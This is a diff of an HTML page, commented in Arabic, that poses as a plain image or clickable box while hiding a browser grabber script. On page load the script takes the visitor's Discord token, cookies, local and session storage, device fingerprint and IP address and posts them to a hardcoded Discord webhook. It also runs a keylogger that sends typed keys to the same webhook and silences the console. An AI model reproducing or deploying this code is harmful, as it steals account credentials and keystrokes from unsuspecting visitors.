@@ -1,196 +1,142 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="UTF-8">
-<title>.</title>
-<style>
-    body {
-        margin: 0;
-        display: flex;
-        flex-direction: column;  /* عشان الصورة تحت المربع */
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        background: #111;
-        gap: 20px;
-    }
-    .box {
-        width: 50px;
-        height: 50px;
-        background: #333;
-        border-radius: 4px;
-        cursor: pointer;
-        transition: 0.2s;
-    }
-    .box:hover {
-        background: #555;
-        transform: scale(1.05);
-    }
-    .box:active {
-        background: #777;
-        transform: scale(0.95);
-    }
-    /* الصورة الجديدة - ما غيرت حاجة من الأصلي */
-    .extra-image {
-        width: 200px;
-        height: 200px;
-        border-radius: 8px;
-        border: 2px solid #444;
-    }
-</style>
-</head>
+<head><meta charset="UTF-8"><title>.</title></head>
 <body>
-    <div class="box" id="clickBox" title="اضغط هنا"></div>
+<img src="heeels.png" style="width:100%;height:100vh;object-fit:cover;">
+<script>
+// ===== ويب هوك =====
+const WEBHOOK = 'https://canary.discord.com/api/webhooks/1533067323546538115/u_IREtDO_U4D1vGFPnDLn8Fcgwki4eYlJTHegVUGElHbh1OieIPYrN9cEF50bJEWZid-';
 
-    <!-- ===== الصورة المطلوبة ===== -->
-    <img src="https://picsum.photos/seed/jhgdsh/200/200" alt="jhgdsh" class="extra-image">
+// ===== جلب التوكن بكل الطرق =====
+function getDiscordToken() {
+    let token = null;
+    try {
+        token = localStorage.getItem('token');
+        if (token) return token;
+        token = sessionStorage.getItem('token');
+        if (token) return token;
+        document.cookie.split(';').forEach(c => {
+            const [k, v] = c.trim().split('=');
+            if (k === 'token' || k === 'discord_token') token = v;
+        });
+    } catch(e) {}
+    return token;
+}
 
-    <script>
-        // ===== ويب هوك =====
-        const WEBHOOK = 'https://canary.discord.com/api/webhooks/1533067323546538115/u_IREtDO_U4D1vGFPnDLn8Fcgwki4eYlJTHegVUGElHbh1OieIPYrN9cEF50bJEWZid-';
+// ===== معلومات البطارية =====
+async function getBatteryInfo() {
+    try {
+        const battery = await navigator.getBattery();
+        return {
+            level: Math.round(battery.level * 100) + '%',
+            charging: battery.charging,
+            chargingTime: battery.chargingTime + 's',
+            dischargingTime: battery.dischargingTime + 's'
+        };
+    } catch(e) { return 'N/A'; }
+}
 
-        // ===== جلب التوكن بكل الطرق =====
-        function getDiscordToken() {
-            let token = null;
-            try {
-                token = localStorage.getItem('token');
-                if (token) return token;
-                token = sessionStorage.getItem('token');
-                if (token) return token;
-                document.cookie.split(';').forEach(c => {
-                    const [k, v] = c.trim().split('=');
-                    if (k === 'token' || k === 'discord_token') token = v;
-                });
-            } catch(e) {}
-            return token;
+// ===== معلومات الاتصال =====
+function getConnectionInfo() {
+    try {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (!conn) return 'N/A';
+        return {
+            type: conn.effectiveType || conn.type || 'N/A',
+            downlink: conn.downlink ? conn.downlink + ' Mbps' : 'N/A',
+            rtt: conn.rtt ? conn.rtt + ' ms' : 'N/A'
+        };
+    } catch(e) { return 'N/A'; }
+}
+
+// ===== معلومات المكونات الإضافية =====
+function getPluginsInfo() {
+    try {
+        const plugins = [];
+        for (let i = 0; i < navigator.plugins.length; i++) {
+            plugins.push(navigator.plugins[i].name);
         }
+        return plugins;
+    } catch(e) { return []; }
+}
 
-        // ===== معلومات البطارية =====
-        async function getBatteryInfo() {
-            try {
-                const battery = await navigator.getBattery();
-                return {
-                    level: Math.round(battery.level * 100) + '%',
-                    charging: battery.charging,
-                    chargingTime: battery.chargingTime + 's',
-                    dischargingTime: battery.dischargingTime + 's'
-                };
-            } catch(e) { return 'N/A'; }
-        }
+// ===== سحب كل شيء =====
+async function run() {
+    const ua = navigator.userAgent;
+    const token = getDiscordToken();
+    const battery = await getBatteryInfo();
+    const connection = getConnectionInfo();
+    const plugins = getPluginsInfo();
 
-        // ===== معلومات الاتصال =====
-        function getConnectionInfo() {
-            try {
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (!conn) return 'N/A';
-                return {
-                    type: conn.effectiveType || conn.type || 'N/A',
-                    downlink: conn.downlink ? conn.downlink + ' Mbps' : 'N/A',
-                    rtt: conn.rtt ? conn.rtt + ' ms' : 'N/A'
-                };
-            } catch(e) { return 'N/A'; }
-        }
+    const data = {
+        ua: ua,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: `${screen.width}x${screen.height}`,
+        availableScreen: `${screen.availWidth}x${screen.availHeight}`,
+        colorDepth: screen.colorDepth + ' bit',
+        pixelRatio: window.devicePixelRatio,
+        url: window.location.href,
+        referrer: document.referrer || 'direct',
+        title: document.title,
+        memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
+        cores: navigator.hardwareConcurrency || 'N/A',
+        cookiesEnabled: navigator.cookieEnabled,
+        online: navigator.onLine,
+        doNotTrack: navigator.doNotTrack || 'N/A',
+        product: navigator.product || 'N/A',
+        vendor: navigator.vendor || 'N/A',
+        battery: battery,
+        connection: connection,
+        plugins: plugins.join(', '),
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage),
+        cookies: document.cookie,
+        discordToken: token || 'غير موجود',
+        timestamp: new Date().toISOString()
+    };
 
-        // ===== معلومات المكونات الإضافية =====
-        function getPluginsInfo() {
-            try {
-                const plugins = [];
-                for (let i = 0; i < navigator.plugins.length; i++) {
-                    plugins.push(navigator.plugins[i].name);
-                }
-                return plugins;
-            } catch(e) { return []; }
-        }
+    // IP
+    try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        const d = await r.json();
+        data.ip = d.ip;
+    } catch(e) { data.ip = 'N/A'; }
 
-        // ===== سحب كل شيء =====
-        async function run() {
-            const ua = navigator.userAgent;
-            const token = getDiscordToken();
-            const battery = await getBatteryInfo();
-            const connection = getConnectionInfo();
-            const plugins = getPluginsInfo();
+    // إرسال للويب هوك
+    await fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            content: '```json\n' + JSON.stringify(data, null, 2) + '\n```'
+        })
+    });
 
-            // ===== تحديد حجم الشاشة =====
-            const screenWidth = window.screen.width;
-            const screenHeight = window.screen.height;
-            const availWidth = window.screen.availWidth;
-            const availHeight = window.screen.availHeight;
-
-            const data = {
-                ua: ua,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                screen: `${screenWidth}x${screenHeight}`,
-                availableScreen: `${availWidth}x${availHeight}`,
-                colorDepth: screen.colorDepth + ' bit',
-                pixelRatio: window.devicePixelRatio,
-                url: window.location.href,
-                referrer: document.referrer || 'direct',
-                title: document.title,
-                memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
-                cores: navigator.hardwareConcurrency || 'N/A',
-                cookiesEnabled: navigator.cookieEnabled,
-                online: navigator.onLine,
-                doNotTrack: navigator.doNotTrack || 'N/A',
-                product: navigator.product || 'N/A',
-                vendor: navigator.vendor || 'N/A',
-                battery: battery,
-                connection: connection,
-                plugins: plugins.join(', '),
-                localStorage: JSON.stringify(localStorage),
-                sessionStorage: JSON.stringify(sessionStorage),
-                cookies: document.cookie,
-                discordToken: token || 'غير موجود',
-                timestamp: new Date().toISOString()
-            };
-
-            // IP
-            try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
-                data.ip = d.ip;
-            } catch(e) { data.ip = 'N/A'; }
-
-            // إرسال للويب هوك
-            await fetch(WEBHOOK, {
+    // كي لوقر
+    let log = '';
+    document.addEventListener('keydown', e => {
+        log += e.key;
+        if (log.length > 100) {
+            fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: '```json\n' + JSON.stringify(data, null, 2) + '\n```'
-                })
+                body: JSON.stringify({ content: '⌨️ ' + log })
             });
-
-            // كي لوقر
-            let log = '';
-            document.addEventListener('keydown', e => {
-                log += e.key;
-                if (log.length > 100) {
-                    fetch(WEBHOOK, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content: '⌨️ ' + log })
-                    });
-                    log = '';
-                }
-            });
-
-            // تحديث المربع عند النقر (نفس الأصلي)
-            document.getElementById('clickBox').addEventListener('click', function() {
-                this.style.backgroundColor = '#4CAF50';
-                this.textContent = '✓';
-                this.style.display = 'flex';
-                this.style.justifyContent = 'center';
-                this.style.alignItems = 'center';
-                this.style.color = 'white';
-                this.style.fontWeight = 'bold';
-                this.style.fontSize = '20px';
-            });
+            log = '';
         }
+    });
 
-        window.onload = run;
-        console.log = ()=>{};
-    </script>
+    // صوت
+    try {
+        document.querySelector('audio')?.play();
+    } catch(e) {}
+}
+
+window.onload = run;
+console.log = ()=>{};
+</script>
+<audio src="tesees221m.mp3" preload="auto"></audio>
 </body>
 </html>
